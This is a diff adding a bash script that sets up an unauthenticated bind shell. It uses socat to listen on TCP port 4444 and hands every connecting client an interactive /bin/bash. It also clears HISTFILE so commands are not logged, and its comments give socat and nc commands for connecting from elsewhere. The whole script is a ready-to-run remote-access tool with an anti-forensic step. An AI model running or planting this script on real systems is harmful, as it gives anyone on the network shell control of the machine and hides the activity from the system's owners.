@@ -1,0 +1,31 @@
+#!/bin/bash
+
+set -euo pipefail
+
+#
+# a simple bind shell
+#
+# https://gtfobins.github.io/gtfobins/socat/#bind-shell
+#
+# Connect using:
+#
+#   socat file:`tty`,raw,echo=0 tcp:address:4444
+#   (replace address)
+#
+#   OR
+#
+#   nc address 4444
+#   (replace address, not fully interactive)
+#
+# Use `killshell` to kill the shell.
+#
+
+killshell() {
+    pkill -f "socat tcp-listen:4444" || true
+}
+
+killshell
+export -f killshell
+export HISTFILE=
+
+socat tcp-listen:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane
